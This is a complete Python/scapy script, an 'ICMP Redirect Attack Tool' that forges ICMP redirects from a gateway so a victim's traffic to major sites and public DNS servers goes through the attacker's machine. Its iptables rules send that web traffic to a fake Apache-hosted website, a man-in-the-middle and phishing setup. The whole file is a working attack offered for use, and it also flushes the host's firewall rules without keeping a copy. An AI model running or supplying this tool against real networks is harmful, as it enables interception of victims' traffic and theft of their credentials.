#!/usr/bin/python3
from scapy.all import IP, ICMP, UDP, send, Raw, Ether, get_if_hwaddr, ARP, srp
import sys
import time
import logging
import subprocess
import os
import argparse
import socket
import requests

# Configure logging with colored output and ASCII indicators
class ColorFormatter(logging.Formatter):
    """Custom formatter with colors"""
    grey = "\x1b[38;20m"
    green = "\x1b[32;20m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31;20m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"

    FORMATS = {
        logging.DEBUG: grey,
        logging.INFO: green,
        logging.WARNING: yellow,
        logging.ERROR: red,
        logging.CRITICAL: bold_red
    }

    def format(self, record):
        color = self.FORMATS.get(record.levelno)
        record.msg = f"{color}{record.msg}{self.reset}"
        return super().format(record)

# Setup logging with custom formatter
logger = logging.getLogger()
logger.setLevel(logging.INFO)
ch = logging.StreamHandler()
ch.setFormatter(ColorFormatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(ch)

class ICMPRedirectAttack:
    def __init__(self, interface, victim_ip, gateway_ip, attacker_ip):
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_ip = attacker_ip
        self.fake_site_port = 80
        
        self.STATUS = {
            'success': '[+]',
            'info': '[*]',
            'error': '[-]',
            'warning': '[!]'
        }
        
        # Validate setup
        if not self.verify_prerequisites():
            sys.exit(1)
            
        # Validate IPs and get MACs
        self.validate_ips()
        self.victim_mac = self.get_mac(self.victim_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        self.attacker_mac = get_if_hwaddr(self.interface)
        
        logging.info(f"{self.STATUS['info']} Initialized with:")
        logging.info(f"{self.STATUS['info']} Interface: {self.interface}")
        logging.info(f"{self.STATUS['info']} Victim: {self.victim_ip} ({self.victim_mac})")
        logging.info(f"{self.STATUS['info']} Gateway: {self.gateway_ip} ({self.gateway_mac})")
        logging.info(f"{self.STATUS['info']} Attacker: {self.attacker_ip} ({self.attacker_mac})")

    def verify_prerequisites(self):
        """Verify all prerequisites before attack"""
        try:
            # Check Apache status
            apache_status = subprocess.run(
                ["systemctl", "is-active", "apache2"],
                capture_output=True, text=True
            ).stdout.strip()
            
            if apache_status != "active":
                logging.error(f"{self.STATUS['error']} Apache is not running!")
                logging.info(f"{self.STATUS['info']} Please start Apache service")
                return False

            # Check fake website
            if not os.path.exists("/var/www/html/index.html"):
                logging.error(f"{self.STATUS['error']} Fake website not found!")
                logging.info(f"{self.STATUS['info']} Please run create_fake_site.py first")
                return False

            # Test fake website accessibility
            try:
                response = requests.get(f"http://{self.attacker_ip}", timeout=2)
                if response.status_code != 200:
                    logging.error(f"{self.STATUS['error']} Fake website is not accessible!")
                    return False
            except requests.RequestException:
                logging.error(f"{self.STATUS['error']} Cannot access fake website!")
                return False

            # Check IP forwarding
            with open("/proc/sys/net/ipv4/ip_forward") as f:
                if f.read().strip() != "1":
                    logging.error(f"{self.STATUS['error']} IP forwarding is not enabled!")
                    return False

            return True
            
        except Exception as e:
            logging.error(f"{self.STATUS['error']} Prerequisite check failed: {e}")
            return False

    def validate_ips(self):
        """Validate IP addresses are in the same subnet"""
        try:
            from ipaddress import ip_network, ip_address
            
            # Create a network object from the victim's IP address
            network = ip_network(f"{self.victim_ip}/24", strict=False)  # Assuming a /24 subnet
            
            # Check if victim, gateway, and attacker are in the same network
            if not (ip_address(self.gateway_ip) in network and ip_address(self.attacker_ip) in network):
                raise ValueError("Victim, Gateway, and Attacker must be in the same subnet!")
                
        except Exception as e:
            logging.error(f"{self.STATUS['error']} IP validation error: {e}")
            sys.exit(1)

    def get_mac(self, ip):
        """Get MAC address for an IP using ARP"""
        try:
            # Create ARP request
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # Send packet and get response
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False, iface=self.interface)[0]
            
            if answered_list:
                return answered_list[0][1].hwsrc
            return None
        except Exception as e:
            logging.error(f"{self.STATUS['error']} Error getting MAC for {ip}: {e}")
            return None

    def setup_redirection(self):
        """Setup iptables for web traffic redirection"""
        logging.info(f"{self.STATUS['info']} Setting up traffic redirection...")
        
        commands = [
            "iptables -F",
            "iptables -t nat -F",
            # Redirect HTTP traffic
            f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {self.fake_site_port}",
            # Enable IP forwarding
            "echo 1 > /proc/sys/net/ipv4/ip_forward",
            # Accept forwarded packets
            "iptables -A FORWARD -j ACCEPT",
            # Allow established connections
            "iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT"
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, shell=True, check=True)
                logging.info(f"{self.STATUS['success']} {cmd}")
            except subprocess.CalledProcessError as e:
                logging.error(f"{self.STATUS['error']} Failed: {cmd}")
                logging.error(str(e))
                return False
        return True

    def send_redirect(self, target_ip):
        """Send ICMP redirect packets for specific target"""
        redirect = IP(
            src=self.gateway_ip,
            dst=self.victim_ip
        )/ICMP(
            type=5,  # Redirect
            code=1,  # Redirect for host
            gw=self.attacker_ip
        )/IP(
            src=self.victim_ip,
            dst=target_ip
        )/UDP(
            sport=80,
            dport=80
        )

        # Send multiple redirects to ensure it works
        for _ in range(3):
            send(redirect, iface=self.interface, verbose=False)
            time.sleep(0.1)

    def verify_apache(self):
        """Verify Apache is running and fake website is accessible"""
        try:
            result = subprocess.run(
                "systemctl is-active apache2",
                shell=True, capture_output=True, text=True
            )
            if result.stdout.strip() != "active":
                logging.error(f"{self.STATUS['error']} Apache is not running!")
                logging.info(f"{self.STATUS['info']} Starting Apache...")
                subprocess.run("systemctl start apache2", shell=True, check=True)
            
            # Verify website is accessible
            result = subprocess.run(
                f"curl -s -I http://localhost:{self.fake_site_port}",
                shell=True, capture_output=True, text=True
            )
            if "200 OK" not in result.stdout:
                raise Exception("Fake website is not accessible!")
                
            logging.info(f"{self.STATUS['success']} Fake website is ready!")
            return True
        except Exception as e:
            logging.error(f"{self.STATUS['error']} Website verification failed: {e}")
            return False

    def start_attack(self):
        """Main attack loop"""
        logging.info(f"{self.STATUS['info']} Starting ICMP redirect attack...")
        
        if not self.setup_redirection():
            logging.error(f"{self.STATUS['error']} Failed to setup redirection!")
            return

        # Common web domains to redirect
        target_domains = [
            'www.google.com',
            'www.facebook.com',
            'www.microsoft.com',
            'www.apple.com',
            'www.amazon.com',
            'www.youtube.com',
            'www.netflix.com'
        ]
        
        try:
            logging.info(f"{self.STATUS['info']} Sending ICMP redirects...")
            while True:
                # Resolve and redirect common domains
                for domain in target_domains:
                    try:
                        ip = socket.gethostbyname(domain)
                        self.send_redirect(ip)
                        logging.debug(f"{self.STATUS['info']} Redirecting {domain} ({ip})")
                    except socket.gaierror:
                        continue
                
                # Also redirect common DNS servers
                for dns in ['8.8.8.8', '8.8.4.4', '1.1.1.1']:
                    self.send_redirect(dns)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            logging.info(f"{self.STATUS['info']} Attack stopped by user")
            self.cleanup()

    def cleanup(self):
        """Clean up after attack"""
        logging.info(f"{self.STATUS['info']} Cleaning up...")
        commands = [
            "iptables -F",
            "iptables -t nat -F",
            "echo 0 > /proc/sys/net/ipv4/ip_forward"
        ]
        
        for cmd in commands:
            subprocess.run(cmd, shell=True)

def parse_arguments():
    parser = argparse.ArgumentParser(description='ICMP Redirect Attack Tool')
    parser.add_argument('-i', '--interface', required=True,
                        help='Network interface to use (e.g., eth0)')
    parser.add_argument('-v', '--victim', required=True,
                        help='Victim IP address')
    parser.add_argument('-g', '--gateway', required=True,
                        help='Gateway IP address')
    parser.add_argument('-a', '--attacker', required=True,
                        help='Attacker IP address')
    return parser.parse_args()

def check_and_install_dependencies():
    """Check and install required dependencies"""
    print("[*] Checking dependencies...")
    
    # Required packages
    required_packages = {
        'scapy': 'python3-scapy',
        'requests': 'python3-requests'
    }
    
    # Check and install Python packages using apt
    for package, apt_package in required_packages.items():
        try:
            subprocess.run(['python3', '-c', f'import {package}'], check=True)
        except subprocess.CalledProcessError:
            print(f"[!] {package} not found. Installing...")
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y', apt_package], check=True)
    
    # Check system dependencies
    system_packages = ['iptables', 'net-tools']
    for package in system_packages:
        try:
            subprocess.run(['which', package], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except subprocess.CalledProcessError:
            print(f"[!] {package} not found. Installing...")
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run(['sudo', 'apt-get', 'install', '-y', package], check=True)
    
    print("[+] All dependencies installed successfully!")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(f"[-] Please run as root")
        sys.exit(1)

    try:
        # Check dependencies first
        check_and_install_dependencies()
        
        args = parse_arguments()
        
        # Example usage message
        print("""Example usage:
    sudo ./real_icmp_redirect_attack.py -i eth0 \\
        -v 192.168.201.10 \\
        -g 192.168.201.1 \\
        -a 192.168.201.20
        """)

        attack = ICMPRedirectAttack(
            interface=args.interface,
            victim_ip=args.victim,
            gateway_ip=args.gateway,
            attacker_ip=args.attacker
        )
        attack.start_attack()
    except KeyboardInterrupt:
        print("\n[-] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {str(e)}")
        sys.exit(1)